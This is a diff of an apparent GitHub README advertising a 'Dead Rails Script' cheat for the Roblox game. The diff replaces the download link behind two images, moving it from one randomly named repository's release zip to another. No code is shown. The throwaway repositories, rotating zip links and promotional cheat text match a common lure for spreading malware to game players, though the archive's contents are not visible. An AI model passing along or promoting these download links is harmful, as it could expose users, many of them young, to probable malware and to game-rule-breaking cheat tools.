@@ -3,10 +3,10 @@
 Roblox is a platform where creativity and immersive gameplay come together. Among the vast selection of games and experiences, *Dead Rails* has stood out as a thrilling, action-packed game, combining fast-paced gameplay with intricate mechanics. For those looking to take their *Dead Rails* gameplay to the next level, using a well-designed script can make a huge difference. In this article, we’ll dive into everything you need to know about *Dead Rails Script*, offering a complete guide to improve your performance, unlock hidden features, and enhance your overall gaming experience.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 ### What is Dead Rails Script?
 
